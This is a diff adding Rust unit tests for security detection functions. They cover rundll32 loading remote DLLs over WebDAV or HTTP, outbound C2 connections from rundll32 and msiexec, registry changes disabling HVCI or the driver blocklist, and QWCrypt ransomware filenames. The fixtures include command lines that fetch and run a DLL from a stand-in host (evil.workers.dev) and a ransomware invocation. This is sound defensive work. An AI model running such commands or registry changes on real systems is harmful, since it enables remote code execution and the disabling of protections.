@@ -1135,4 +1135,152 @@ mod tests {
 
     #[test]
     fn qwcrypt_cluster_empty_events() { assert!(detect_qwcrypt_cluster(&[]).is_empty()); }
+
+    // ── Gap-closure detection tests (RED) ────────────────────────────────────
+
+    #[test]
+    fn lnk_webdav_execution_detected_rundll32_unc() {
+        let ev = vec![make_event(4688, "Security",
+            vec![("NewProcessName","C:\\Windows\\System32\\rundll32.exe"),
+                 ("CommandLine","rundll32.exe \\\\evil.workers.dev\\share\\srvcli.dll,DllMain")],
+            1_000_000_000)];
+        let hits = detect_lnk_webdav_execution(&ev);
+        assert!(!hits.is_empty(), "rundll32 with UNC WebDAV path must be detected");
+        assert_eq!(hits[0].mitre_technique_id, "T1204.002");
+    }
+
+    #[test]
+    fn lnk_webdav_execution_detected_rundll32_http() {
+        let ev = vec![make_event(4688, "Security",
+            vec![("NewProcessName","C:\\Windows\\System32\\rundll32.exe"),
+                 ("CommandLine","rundll32.exe http://cdn.workers.dev/netutils.dll,EntryPoint")],
+            1_000_000_000)];
+        let hits = detect_lnk_webdav_execution(&ev);
+        assert!(!hits.is_empty(), "rundll32 with http path must be detected");
+    }
+
+    #[test]
+    fn lnk_webdav_execution_local_rundll32_not_detected() {
+        let ev = vec![make_event(4688, "Security",
+            vec![("NewProcessName","C:\\Windows\\System32\\rundll32.exe"),
+                 ("CommandLine","rundll32.exe C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL")],
+            1_000)];
+        assert!(detect_lnk_webdav_execution(&ev).is_empty());
+    }
+
+    #[test]
+    fn lnk_webdav_execution_no_cmdline_not_detected() {
+        let ev = vec![make_event(4688, "Security",
+            vec![("NewProcessName","C:\\Windows\\System32\\rundll32.exe")],
+            1_000)];
+        assert!(detect_lnk_webdav_execution(&ev).is_empty());
+    }
+
+    #[test]
+    fn lnk_webdav_execution_empty() { assert!(detect_lnk_webdav_execution(&[]).is_empty()); }
+
+    #[test]
+    fn webdav_c2_detected_sysmon_rundll32_outbound() {
+        let ev = vec![make_event(3, "Microsoft-Windows-Sysmon/Operational",
+            vec![("Image","C:\\Windows\\System32\\rundll32.exe"),
+                 ("DestinationIp","104.21.33.99"),
+                 ("DestinationPort","443"),
+                 ("DestinationHostname","evil.workers.dev")],
+            1_000_000_000)];
+        let hits = detect_webdav_c2(&ev);
+        assert!(!hits.is_empty(), "rundll32 Sysmon EID 3 outbound must be detected");
+        assert_eq!(hits[0].mitre_technique_id, "T1102");
+    }
+
+    #[test]
+    fn webdav_c2_detected_msiexec_outbound() {
+        let ev = vec![make_event(3, "Microsoft-Windows-Sysmon/Operational",
+            vec![("Image","C:\\Windows\\System32\\msiexec.exe"),
+                 ("DestinationIp","185.199.108.153"),
+                 ("DestinationPort","80")],
+            1_000_000_000)];
+        let hits = detect_webdav_c2(&ev);
+        assert!(!hits.is_empty(), "msiexec Sysmon EID 3 outbound must be detected");
+    }
+
+    #[test]
+    fn webdav_c2_svchost_not_detected() {
+        let ev = vec![make_event(3, "Microsoft-Windows-Sysmon/Operational",
+            vec![("Image","C:\\Windows\\System32\\svchost.exe"),
+                 ("DestinationIp","8.8.8.8"),
+                 ("DestinationPort","443")],
+            1_000)];
+        assert!(detect_webdav_c2(&ev).is_empty());
+    }
+
+    #[test]
+    fn webdav_c2_empty() { assert!(detect_webdav_c2(&[]).is_empty()); }
+
+    #[test]
+    fn hvci_registry_disable_detected_on_4657() {
+        let ev = vec![make_event(4657, "Security",
+            vec![("ObjectName","\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config"),
+                 ("ObjectValueName","VulnerableDriverBlocklistEnable"),
+                 ("NewValue","0"),
+                 ("SubjectUserName","SYSTEM")],
+            1_000_000_000)];
+        let hits = detect_hvci_registry_disable(&ev);
+        assert!(!hits.is_empty(), "Driver Blocklist registry disable must be detected");
+        assert_eq!(hits[0].mitre_technique_id, "T1562.001");
+    }
+
+    #[test]
+    fn hvci_registry_disable_detected_deviceguard() {
+        let ev = vec![make_event(4657, "Security",
+            vec![("ObjectName","\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard"),
+                 ("ObjectValueName","EnableVirtualizationBasedSecurity"),
+                 ("NewValue","0")],
+            1_000_000_000)];
+        let hits = detect_hvci_registry_disable(&ev);
+        assert!(!hits.is_empty(), "HVCI DeviceGuard disable must be detected");
+    }
+
+    #[test]
+    fn hvci_registry_disable_unrelated_key_not_detected() {
+        let ev = vec![make_event(4657, "Security",
+            vec![("ObjectName","\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
+                 ("ObjectValueName","SomeApp"),
+                 ("NewValue","C:\\malware.exe")],
+            1_000)];
+        assert!(detect_hvci_registry_disable(&ev).is_empty());
+    }
+
+    #[test]
+    fn hvci_registry_disable_empty() { assert!(detect_hvci_registry_disable(&[]).is_empty()); }
+
+    #[test]
+    fn qwcrypt_ioc_filename_rbcw_detected() {
+        let ev = vec![make_event(4688, "Security",
+            vec![("NewProcessName","C:\\Users\\Public\\rbcw.exe"),
+                 ("CommandLine","rbcw.exe --hv --excludeVM GatewayVM key123")],
+            1_000_000_000)];
+        let hits = detect_qwcrypt_ioc_filename(&ev);
+        assert!(!hits.is_empty(), "rbcw.exe execution must be detected as IOC");
+        assert_eq!(hits[0].mitre_technique_id, "T1486");
+    }
+
+    #[test]
+    fn qwcrypt_ioc_filename_adnotification_detected() {
+        let ev = vec![make_event(4688, "Security",
+            vec![("NewProcessName","C:\\Users\\Temp\\ADNotificationManager.exe")],
+            1_000_000_000)];
+        let hits = detect_qwcrypt_ioc_filename(&ev);
+        assert!(!hits.is_empty(), "ADNotificationManager.exe must be detected as IOC");
+    }
+
+    #[test]
+    fn qwcrypt_ioc_filename_benign_not_detected() {
+        let ev = vec![make_event(4688, "Security",
+            vec![("NewProcessName","C:\\Windows\\System32\\notepad.exe")],
+            1_000)];
+        assert!(detect_qwcrypt_ioc_filename(&ev).is_empty());
+    }
+
+    #[test]
+    fn qwcrypt_ioc_filename_empty() { assert!(detect_qwcrypt_ioc_filename(&[]).is_empty()); }
 }
